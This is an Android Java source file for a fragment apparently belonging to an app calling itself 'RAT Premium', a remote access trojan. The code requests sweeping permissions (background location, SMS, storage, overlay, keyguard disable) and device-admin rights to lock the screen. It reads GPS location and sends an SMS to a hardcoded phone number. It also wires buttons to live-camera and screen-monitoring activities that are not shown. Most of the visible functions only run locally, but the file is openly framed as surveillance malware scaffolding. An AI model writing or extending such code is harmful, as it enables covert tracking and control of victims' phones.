package com.rat.premium;

import android.Manifest;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Bundle;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.fragment.app.Fragment;

import java.util.ArrayList;
import java.util.List;

public class RATFragment extends Fragment {
    private CameraManager cameraManager;
    private String cameraIdBack, cameraIdFront;
    private boolean isFlashOn = false;
    private LocationManager locationManager;
    private DevicePolicyManager devicePolicyManager;
    private ComponentName adminComponent;

    @Override public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_rat, container, false);

        cameraManager = (CameraManager) getActivity().getSystemService(getContext().CAMERA_SERVICE);
        try {
            for (String id : cameraManager.getCameraIdList()) {
                if (cameraManager.getCameraCharacteristics(id).get(android.hardware.camera2.CameraCharacteristics.LENS_FACING)
                        == android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK) {
                    cameraIdBack = id;
                } else {
                    cameraIdFront = id;
                }
            }
        } catch (CameraAccessException e) {}

        locationManager = (LocationManager) getActivity().getSystemService(getContext().LOCATION_SERVICE);
        devicePolicyManager = (DevicePolicyManager) getActivity().getSystemService(getContext().DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(getContext(), AdminReceiver.class);

        requestPermissions();

        Button btnCamFront = view.findViewById(R.id.btnCamFront);
        Button btnCamBack = view.findViewById(R.id.btnCamBack);
        Button btnGmail = view.findViewById(R.id.btnGmail);
        Button btnGallery = view.findViewById(R.id.btnGallery);
        Button btnSMS = view.findViewById(R.id.btnSMS);
        Button btnWhatsApp = view.findViewById(R.id.btnWhatsApp);
        Button btnFlash = view.findViewById(R.id.btnFlash);
        Button btnLocation = view.findViewById(R.id.btnLocation);
        Button btnLock = view.findViewById(R.id.btnLock);
        Button btnSendSMS = view.findViewById(R.id.btnSendSMS);
        Button btnLiveCam = view.findViewById(R.id.btnLiveCam);
        Button btnScreenMonitor = view.findViewById(R.id.btnScreenMonitor);

        btnCamFront.setOnClickListener(v -> openCamera(true));
        btnCamBack.setOnClickListener(v -> openCamera(false));
        btnGmail.setOnClickListener(v -> openApp("com.google.android.gm"));
        btnGallery.setOnClickListener(v -> openGallery());
        btnSMS.setOnClickListener(v -> openSMS());
        btnWhatsApp.setOnClickListener(v -> openApp("com.whatsapp"));
        btnFlash.setOnClickListener(v -> toggleFlash());
        btnLocation.setOnClickListener(v -> getLocation());
        btnLock.setOnClickListener(v -> lockScreen());
        btnSendSMS.setOnClickListener(v -> sendSMS());
        btnLiveCam.setOnClickListener(v -> startLiveCamera());
        btnScreenMonitor.setOnClickListener(v -> startScreenMonitor());

        return view;
    }

    private void requestPermissions() {
        String[] perms = {
                Manifest.permission.CAMERA,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_BACKGROUND_LOCATION,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.SYSTEM_ALERT_WINDOW,
                Manifest.permission.WAKE_LOCK,
                Manifest.permission.DISABLE_KEYGUARD
        };
        List<String> list = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(getContext(), p) != PackageManager.PERMISSION_GRANTED)
                list.add(p);
        }
        if (!list.isEmpty())
            ActivityCompat.requestPermissions(getActivity(), list.toArray(new String[0]), 123);
    }

    private void openCamera(boolean front) {
        Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
        startActivity(intent);
    }

    private void openApp(String pkg) {
        try {
            Intent intent = getActivity().getPackageManager().getLaunchIntentForPackage(pkg);
            if (intent != null) startActivity(intent);
            else Toast.makeText(getContext(), "Aplikasi tidak terinstal", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            Toast.makeText(getContext(), "Gagal buka", Toast.LENGTH_SHORT).show();
        }
    }

    private void openGallery() {
        Intent intent = new Intent(Intent.ACTION_PICK, MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
        startActivity(intent);
    }

    private void openSMS() {
        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("sms:"));
        startActivity(intent);
    }

    private void toggleFlash() {
        try {
            if (cameraManager != null) {
                isFlashOn = !isFlashOn;
                String id = cameraIdBack != null ? cameraIdBack : cameraIdFront;
                if (id != null) {
                    cameraManager.setTorchMode(id, isFlashOn);
                    Toast.makeText(getContext(), isFlashOn ? "Senter ON" : "Senter OFF", Toast.LENGTH_SHORT).show();
                }
            }
        } catch (Exception e) {
            Toast.makeText(getContext(), "Gagal senter", Toast.LENGTH_SHORT).show();
        }
    }

    private void getLocation() {
        if (ActivityCompat.checkSelfPermission(getContext(), Manifest.permission.ACCESS_FINE_LOCATION)
                != PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(getContext(), "Izin lokasi belum diberikan", Toast.LENGTH_SHORT).show();
            return;
        }
        try {
            Location loc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) {
                Toast.makeText(getContext(), "Lat: " + loc.getLatitude() + ", Lng: " + loc.getLongitude(), Toast.LENGTH_LONG).show();
            } else {
                Toast.makeText(getContext(), "Lokasi tidak ditemukan", Toast.LENGTH_SHORT).show();
            }
        } catch (Exception e) {
            Toast.makeText(getContext(), "Error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    private void lockScreen() {
        if (!devicePolicyManager.isAdminActive(adminComponent)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            startActivity(intent);
            Toast.makeText(getContext(), "Aktifkan admin dulu", Toast.LENGTH_LONG).show();
            return;
        }
        devicePolicyManager.lockNow();
        Toast.makeText(getContext(), "Screen locked", Toast.LENGTH_SHORT).show();
    }

    private void sendSMS() {
        String number = "085746399596";
        String text = "Test SMS dari RAT Premium";
        try {
            SmsManager sms = SmsManager.getDefault();
            sms.sendTextMessage(number, null, text, null, null);
            Toast.makeText(getContext(), "SMS terkirim ke " + number, Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            Toast.makeText(getContext(), "Gagal kirim SMS", Toast.LENGTH_SHORT).show();
        }
    }

    private void startLiveCamera() {
        Intent intent = new Intent(getContext(), LiveCameraActivity.class);
        startActivity(intent);
    }

    private void startScreenMonitor() {
        Intent intent = new Intent(getContext(), ScreenMonitorActivity.class);
        startActivity(intent);
    }
}
